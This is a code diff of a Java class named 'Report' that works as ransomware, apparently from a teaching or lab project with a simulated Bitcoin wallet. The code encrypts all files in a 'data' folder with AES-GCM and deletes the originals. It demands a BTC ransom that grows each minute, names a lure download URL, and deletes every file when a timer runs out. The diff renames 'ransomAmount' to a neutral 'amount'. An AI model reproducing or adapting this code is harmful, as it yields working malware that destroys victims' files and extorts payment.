@@ -18,28 +18,32 @@ public class Report implements IReport {
     private static final String ENCRYPT_ALGO = "AES/GCM/NoPadding";
     private static final int TAG_LENGTH_BIT = 128;
     private static final int IV_LENGTH_BYTE = 12;
+    private SecretKey secretKey;
+    private byte[] nonce;
     // Attacker
     private final Wallet wallet;
     private final double initialBalance;
     // Ransomware Params
     private final File directory;
-    private SecretKey secretKey;
-    private byte[] nonce;
     private boolean isEncrypted;
-    private double ransomAmount;
+    private double amount;
     private int minute;
 
 
     public Report() {
         this.isEncrypted = false;
+
+        // Attacker
         this.wallet = new Wallet();
         initialBalance = wallet.getBalance();
 
-        this.ransomAmount = 0.02755;
+        // Ransomware Params
+        this.directory = new File(String.valueOf(Paths.get("data").toAbsolutePath()));
+        this.isEncrypted = false;
+        this.amount = 0.02755;
         this.minute = 0;
 
-        // Path of dedicated directory
-        this.directory = new File(String.valueOf(Paths.get("data").toAbsolutePath()));
+        // AES - Cryptography Params
         try {
             this.nonce = AESCryptoUtils.getRandomNonce(IV_LENGTH_BYTE);
             this.secretKey = AESCryptoUtils.getAESKey();
@@ -79,12 +83,12 @@ public class Report implements IReport {
     @Override
     public void checkPayment() throws Exception {
         if (isEncrypted) {
-            if ((wallet.getBalance() >= (this.initialBalance + ransomAmount)) && Network.getInstance().isChainValid()) {
-                System.out.println("transaction successful! Your files will be decrypted.");
+            if ((wallet.getBalance() >= (this.initialBalance + amount)) && Network.getInstance().isChainValid()) {
+                System.out.println("Transaction successful! Your files will be decrypted.");
                 startDecryption();
             } else {
                 System.out.println("You need to pay me the full amount!");
-                System.out.format("To decrypt your files, I need %.5f more BTC!\n", (ransomAmount - wallet.getBalance()));
+                System.out.format("To decrypt your files, I need %.5f more BTC!\n", (amount - wallet.getBalance()));
             }
         } else {
             System.out.println("What payment do you want to check? Have you tried launching http://www.trust-me.mcg/report.jar?");
@@ -94,7 +98,6 @@ public class Report implements IReport {
     @Override
     public void startEncryption() throws Exception {
         if (!isEncrypted) {
-
             // Arraylist of all files in said directory
             List<File> files = new ArrayList<>();
 
@@ -111,24 +114,21 @@ public class Report implements IReport {
                 try (FileOutputStream fos = new FileOutputStream(f.getAbsolutePath() + ".mcg")) {
                     fos.write(encrFile);
                 }
-
                 f.delete();
             }
 
             isEncrypted = true;
-
             startTimer();
 
             System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");
         } else {
-            System.out.println("Your files already have been encrypted. Pay " + ransomAmount + " BTC to start the decryption.");
+            System.out.format("Your files already have been encrypted. Pay %.5f BTC to start the decryption.\n", amount);
         }
     }
 
     @Override
     public void startDecryption() throws Exception {
         if (isEncrypted) {
-
             List<File> files = new ArrayList<>();
 
             for (File fileEntry : Objects.requireNonNull(directory.listFiles())) {
@@ -144,7 +144,6 @@ public class Report implements IReport {
                 try (FileOutputStream fos = new FileOutputStream(f.getAbsolutePath().split(".mcg")[0])) {
                     fos.write(decrFile);
                 }
-
                 f.delete();
             }
             isEncrypted = false;
@@ -158,16 +157,17 @@ public class Report implements IReport {
             public void run() {
                 switch (minute) {
                     case 1, 2, 3 -> {
-                        setRansomAmount(ransomAmount + 0.01);
-                        System.out.format("Amount to pay increased by 0,01 to %.5f BTC.\n", ransomAmount);
+                        setAmount(amount + 0.01);
+                        System.out.format("Amount to pay increased by 0,01 to %.5f BTC.\n", amount);
                     }
                     case 4 -> {
-                        setRansomAmount(ransomAmount + 0.01);
-                        System.out.format("Pay %.5f BTC immediately or your files will be irrevocably deleted.\n", ransomAmount);
+                        setAmount(amount + 0.01);
+                        System.out.format("Pay %.5f BTC immediately or your files will be irrevocably deleted.\n", amount);
                     }
                     case 5 -> {
                         System.out.println("Now your files will be irrevocably deleted.");
                         deleteAllFiles();
+                        timer.cancel();
                         System.exit(0);
                     }
                     default -> {
@@ -179,7 +179,6 @@ public class Report implements IReport {
     }
 
     private void deleteAllFiles() {
-
         List<File> files = new ArrayList<>(Arrays.asList(Objects.requireNonNull(directory.listFiles())));
 
         for (File f : files) {
@@ -188,12 +187,12 @@ public class Report implements IReport {
     }
 
 
-    public double getRansomAmount() {
-        return ransomAmount;
+    public double getAmount() {
+        return amount;
     }
 
-    public void setRansomAmount(double ransomAmount) {
-        this.ransomAmount = ransomAmount;
+    public void setAmount(double amount) {
+        this.amount = amount;
     }
 
     public Wallet getWallet() {
